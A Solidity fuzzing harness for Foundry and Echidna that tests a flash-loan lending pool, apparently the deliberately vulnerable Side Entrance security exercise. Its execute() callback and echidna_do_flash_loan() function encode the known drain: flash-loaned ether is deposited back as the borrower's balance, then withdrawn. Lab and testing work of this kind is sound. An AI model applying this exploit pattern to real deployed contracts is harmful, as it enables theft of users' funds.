pragma solidity ^0.8.0;


import "./SideEntranceLenderPool.sol";

//::: In case of forge test
// forge install foundry-rs/forge-std --no-commit
// forge install dapphub/ds-test --no-commit
import "forge-std/console.sol";
import { Test } from "forge-std/Test.sol";


contract SideEntranceFuzzer is Test {

    SideEntranceLenderPool public lenderPool;

    uint256 constant INITIAL_BALANCE = 2 ether;

    constructor() payable {
      lenderPool = new SideEntranceLenderPool();
      lenderPool.deposit{value: INITIAL_BALANCE}();

      require(address(lenderPool).balance == INITIAL_BALANCE, "Initial balance is not correct");
    }

    function execute() external payable {
      lenderPool.deposit{value: msg.value}();
      // payable(msg.sender).transfer(msg.value);
      // address(lenderPool).transfer(msg.value);
    }

    function test_echidna_withdraw() external returns (bool) {
      uint256 balanceThisContractBefore = address(this).balance;
      lenderPool.withdraw();
      uint256 balanceThisContractAfter = address(this).balance;
      console.log("balance of this contract before withdraw", balanceThisContractBefore);
      console.log("balance of this contract after withdraw ", balanceThisContractAfter);
      console.log(balanceThisContractAfter >= balanceThisContractBefore);
      return(balanceThisContractAfter >= balanceThisContractBefore);
    }

    function echidna_do_flash_loan() public returns (bool){
      uint256 balanceBefore = address(lenderPool).balance;
      uint256 amount = 1 ether;
      
      console.log("balance of lenderPool before flashLoan", address(lenderPool).balance);
      console.log("balance of this contract", address(this).balance);
      lenderPool.flashLoan(amount);      
      
      console.log("balance of lenderPool before withdraw", address(lenderPool).balance);
      console.log("balance of this contract", address(this).balance);
      lenderPool.withdraw();
      console.log("balance of lenderPool after withdraw", address(lenderPool).balance);
      return(address(lenderPool).balance == balanceBefore);
    }

    function echidna_test_balance() public view returns (bool) {
      return(address(lenderPool).balance >= INITIAL_BALANCE);
    }
    
    // Add receive function to handle ETH transfers
    receive() external payable {}    
}
